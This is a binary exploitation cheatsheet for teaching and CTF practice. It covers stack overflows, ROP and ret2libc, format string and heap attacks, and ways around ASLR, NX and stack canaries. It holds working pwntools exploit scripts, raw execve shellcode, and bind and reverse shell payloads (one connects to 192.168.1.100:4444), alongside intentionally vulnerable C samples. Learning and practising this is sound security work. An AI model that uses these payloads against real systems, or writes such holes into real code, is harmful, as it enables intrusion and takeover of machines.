# Binary Exploitation Cheatsheet

Quick reference for binary exploitation techniques, tools, and defenses.

## ğŸ“š Table of Contents

- [Memory Layout](#memory-layout)
- [Buffer Overflows](#buffer-overflows)
- [Return-Oriented Programming (ROP)](#return-oriented-programming-rop)
- [Shellcode](#shellcode)
- [Format String Vulnerabilities](#format-string-vulnerabilities)
- [Heap Exploitation](#heap-exploitation)
- [Protection Mechanisms](#protection-mechanisms)
- [Tools](#tools)

## ğŸ—ºï¸ Memory Layout

### Process Memory Structure (x86-64)

```
High addresses
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Kernel Space   â”‚ 0xFFFF... (kernel)
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚     Stack       â”‚ â†“ grows down
â”‚                 â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚      ...        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚     Heap        â”‚ â†‘ grows up
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚      BSS        â”‚ Uninitialized data
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚     Data        â”‚ Initialized data
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚     Text        â”‚ Program code (read-only)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
Low addresses
```

### Stack Frame Layout

```
Higher addresses
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Arguments      â”‚ (pushed right to left)
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  Return Addr    â”‚ â† Overwrite this for control
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  Saved RBP      â”‚ (old frame pointer)
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  Local Vars     â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  Buffer         â”‚ â† Overflow starts here
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
Lower addresses
```

## ğŸ’¥ Buffer Overflows

### Stack Buffer Overflow

**Vulnerable Code:**
```c
#include <stdio.h>
#include <string.h>

void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds checking!
}

int main(int argc, char **argv) {
    vulnerable(argv[1]);
    return 0;
}
```

**Exploitation:**
```python
from pwn import *

# Create payload
payload = b'A' * 72           # Fill buffer + saved RBP
payload += p64(0xdeadbeef)    # Overwrite return address

# Send to program
p = process('./vulnerable')
p.sendline(payload)
```

### Finding Offset

```bash
# Using pwntools
cyclic 200 > pattern.txt
./vulnerable $(cat pattern.txt)

# In GDB, get crash address
cyclic -l 0x61616162  # Returns offset
```

### Classic Buffer Overflow Exploit

```python
#!/usr/bin/env python3
from pwn import *

# Configuration
binary = './vulnerable'
elf = ELF(binary)

# Find offset
offset = 72

# Create payload
payload = b'A' * offset
payload += p64(0x4011d6)  # Address of win() function

# Exploit
p = process(binary)
p.sendline(payload)
p.interactive()
```

## ğŸ”— Return-Oriented Programming (ROP)

### What is ROP?

Use existing code "gadgets" (instruction sequences ending in `ret`) to execute arbitrary code without injecting shellcode.

### Finding ROP Gadgets

```bash
# Using ROPgadget
ROPgadget --binary ./binary

# Specific gadgets
ROPgadget --binary ./binary --only "pop|ret"

# Using ropper
ropper --file ./binary --search "pop rdi"

# Using pwntools
from pwn import *
elf = ELF('./binary')
rop = ROP(elf)
print(rop.dump())
```

### Common x64 Gadgets

```assembly
pop rdi; ret     # First argument
pop rsi; ret     # Second argument  
pop rdx; ret     # Third argument
pop rax; ret     # Syscall number
syscall; ret     # Make syscall
```

### Basic ROP Chain

```python
from pwn import *

elf = ELF('./binary')
rop = ROP(elf)

# Build ROP chain
payload = b'A' * offset

# Call system("/bin/sh")
pop_rdi = 0x4011d3        # pop rdi; ret
bin_sh = 0x402000         # address of "/bin/sh"
system_addr = 0x401040    # address of system()

payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system_addr)

p = process('./binary')
p.sendline(payload)
p.interactive()
```

### ret2libc Attack

```python
from pwn import *

# Setup
elf = ELF('./binary')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process('./binary')

# Leak libc address
pop_rdi = 0x401293
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.symbols['main']

# Stage 1: Leak libc
payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)  # Return to main

p.sendline(payload)
p.recvline()
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']

log.info(f"Libc base: {hex(libc.address)}")

# Stage 2: Execute system("/bin/sh")
bin_sh = next(libc.search(b'/bin/sh\x00'))
system = libc.symbols['system']

payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)

p.sendline(payload)
p.interactive()
```

### One-Gadget RCE

```bash
# Find one-gadget addresses
one_gadget /lib/x86_64-linux-gnu/libc.so.6

# Use in exploit
from pwn import *
one_gadget = libc_base + 0x4f3d5
payload = b'A' * offset + p64(one_gadget)
```

## ğŸš Shellcode

### x86-64 Execve Shellcode

```assembly
; execve("/bin/sh", NULL, NULL)
xor rax, rax
push rax
mov rbx, 0x68732f2f6e69622f  ; "/bin//sh" reversed
push rbx
mov rdi, rsp       ; rdi = pointer to "/bin/sh"
push rax
push rdi
mov rsi, rsp       ; rsi = argv
xor rdx, rdx       ; rdx = envp
mov al, 59         ; syscall number for execve
syscall
```

**Shellcode bytes:**
```python
shellcode = b"\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
shellcode += b"\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05"
```

### Shellcode Injection

```python
from pwn import *

# Create shellcode
shellcode = asm(shellcraft.sh())

# Calculate payload
payload = shellcode
payload += b'A' * (offset - len(shellcode))
payload += p64(buffer_address)  # Jump to shellcode

p = process('./vuln')
p.sendline(payload)
p.interactive()
```

### NOP Sled

```python
# Use NOP sled for imprecise addresses
nop_sled = b'\x90' * 100
payload = nop_sled + shellcode + b'A' * padding + p64(approximate_addr)
```

### Useful Shellcodes

```python
from pwn import *

# Linux execve shell
shellcode = asm(shellcraft.sh())

# Read flag
shellcode = asm(shellcraft.cat('flag.txt'))

# Port bind shell (port 1234)
shellcode = asm(shellcraft.bindsh(1234))

# Reverse shell
shellcode = asm(shellcraft.connect('192.168.1.100', 4444) + shellcraft.sh())
```

## ğŸ“ Format String Vulnerabilities

### Vulnerable Code

```c
#include <stdio.h>

void vuln(char *input) {
    printf(input);  // Should be printf("%s", input);
}
```

### Reading Memory

```python
# Read stack values
payload = b"%p " * 10  # Print 10 stack values

# Read specific address
payload = p64(target_addr) + b"%7$s"  # Read as string at 7th parameter

# Read GOT entry
payload = b"%p " + p64(elf.got['printf'])
```

### Writing Memory

```python
# Write to address using %n
# %n writes number of bytes printed so far

# Write single byte
payload = b"AAAA" + p64(target_addr) + b"%100x%7$n"
# Writes 104 (4 + 100) to target_addr

# Write arbitrary value using multiple writes
def fmt_str(address, value):
    payload = b""
    # Build format string for writing 'value' to 'address'
    # Use %hhn for byte writes, %hn for short writes
    return payload
```

### Automated Format String Exploits

```python
from pwn import *

# Automatic format string exploit
p = process('./vuln')
autofmt = FmtStr(p)
autofmt.write(target_addr, value)
autofmt.execute_writes()
```

## ğŸ—‘ï¸ Heap Exploitation

### Heap Structure (glibc malloc)

```
Allocated Chunk:
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Prev Size  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Size | AMP â”‚ A=allocated, M=mmap, P=prev_inuse
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ User Data  â”‚
â”‚    ...     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

Free Chunk:
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Prev Size  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Size | AMP â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ FD (next)  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ BK (prev)  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚    ...     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Use-After-Free (UAF)

```c
// Vulnerable pattern
struct object *obj = malloc(sizeof(struct object));
free(obj);
obj->function_ptr();  // UAF: obj still used after free
```

**Exploitation:**
```python
# 1. Allocate object
# 2. Free object
# 3. Allocate new data in same location
# 4. Trigger use of old pointer
```

### Double Free

```c
free(ptr);
free(ptr);  // Double free vulnerability
```

### Heap Overflow

```python
# Overflow into next chunk's metadata
# Overwrite size/pointers to corrupt heap

payload = b'A' * chunk_size
payload += p64(0)  # prev_size
payload += p64(0x21)  # fake size
payload += p64(target_addr - 0x18)  # fd
payload += p64(target_addr - 0x10)  # bk
```

### tcache Poisoning (glibc >= 2.26)

```python
# 1. Free chunk into tcache
# 2. Overflow to overwrite tcache->next pointer  
# 3. Next allocation returns arbitrary address
```

## ğŸ›¡ï¸ Protection Mechanisms

### Common Protections

| Protection | Description | Bypass |
|------------|-------------|--------|
| **ASLR** | Address Space Layout Randomization | Information leak |
| **DEP/NX** | Data Execution Prevention | ROP/ret2libc |
| **Stack Canary** | Detect stack overflow | Leak canary value |
| **PIE** | Position Independent Executable | Information leak |
| **RELRO** | Relocation Read-Only | Overwrite before relocation |
| **FORTIFY_SOURCE** | Buffer overflow detection | Find unchecked functions |

### Checking Protections

```bash
# Using checksec
checksec ./binary

# Using readelf
readelf -l ./binary | grep GNU_STACK
readelf -d ./binary | grep BIND_NOW

# Using pwntools
from pwn import *
elf = ELF('./binary')
print(elf.checksec())
```

**Output example:**
```
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE
```

### Bypassing Stack Canaries

```python
# 1. Leak canary value
payload = b'A' * offset_to_canary
p.send(payload)
leak = p.recv()
canary = u64(leak[offset:offset+8])

# 2. Include canary in overflow
payload = b'A' * offset
payload += p64(canary)  # Preserve canary
payload += p64(saved_rbp)
payload += p64(ret_addr)  # Overwrite return
```

### Bypassing ASLR

```python
# Leak address from GOT/PLT
# Calculate base address
# Use calculated addresses in exploit

# Example: leak puts address
payload = create_leak_payload()
p.sendline(payload)
puts_leak = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = puts_leak - libc.symbols['puts']
```

### Bypassing NX (DEP)

```python
# Use ROP chains instead of shellcode
# ret2libc
# ret2syscall
# ROP to mprotect() to make stack executable
```

## ğŸ”§ Tools

### Essential Tools

**Debuggers:**
```bash
# GDB with enhancements
gdb -q ./binary
gef> # GDB Enhanced Features
peda> # PEDA (Python Exploit Development Assistant)
pwndbg> # pwndbg

# Install pwndbg
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
```

**Analysis Tools:**
```bash
# Radare2
r2 -d ./binary

# Binary Ninja
binaryninja ./binary

# Ghidra
ghidraRun
```

**Exploitation Frameworks:**
```python
# pwntools
from pwn import *
context.arch = 'amd64'
context.os = 'linux'

# Create process
p = process('./binary')

# Create remote connection
p = remote('host', port)

# ELF operations
elf = ELF('./binary')
libc = ELF('./libc.so.6')
```

### GDB Commands

```bash
# Basic commands
break main              # Set breakpoint
run < input.txt        # Run with input
continue               # Continue execution
stepi / nexti          # Step instruction
info registers         # Show registers
x/20x $rsp            # Examine stack
disassemble main      # Disassemble function

# pwndbg/GEF specific
vmmap                 # Show memory mappings
checksec              # Check security features
search -t string "/bin/sh"  # Search memory
telescope $rsp 20     # Show stack with dereferencing
```

### pwntools Utilities

```python
from pwn import *

# Packing/unpacking
p64(0xdeadbeef)       # Pack 64-bit
u64(data)             # Unpack 64-bit
p32(0xdeadbeef)       # Pack 32-bit

# Shellcode
shellcode = asm(shellcraft.sh())

# ROP
elf = ELF('./binary')
rop = ROP(elf)
rop.call('system', ['/bin/sh'])
payload = rop.chain()

# Cyclic patterns
cyclic(200)           # Generate pattern
cyclic_find(0x61616162)  # Find offset

# Logging
log.info("Info message")
log.success("Success!")
log.error("Error!")
```

## ğŸ¯ Exploitation Workflow

1. **Reconnaissance**
   ```bash
   file binary
   checksec binary
   strings binary
   ```

2. **Static Analysis**
   ```bash
   objdump -d binary
   radare2 binary
   ghidra binary
   ```

3. **Dynamic Analysis**
   ```bash
   gdb ./binary
   ltrace ./binary
   strace ./binary
   ```

4. **Identify Vulnerability**
   - Buffer overflow
   - Format string
   - Use-after-free
   - etc.

5. **Develop Exploit**
   ```python
   # Write exploit script
   # Test locally
   # Adapt for remote
   ```

6. **Test & Refine**
   ```bash
   python3 exploit.py LOCAL
   python3 exploit.py REMOTE
   ```

## ğŸ“š Resources

- [The Shellcoder's Handbook](https://www.wiley.com/en-us/The+Shellcoder's+Handbook%3A+Discovering+and+Exploiting+Security+Holes%2C+2nd+Edition-p-9780470080238)
- [Exploit Education](https://exploit.education/)
- [pwnable.kr](http://pwnable.kr/)
- [ROP Emporium](https://ropemporium.com/)
- [LiveOverflow YouTube](https://www.youtube.com/c/LiveOverflow)

---

**Remember**: Only exploit vulnerabilities in systems you own or have permission to test!
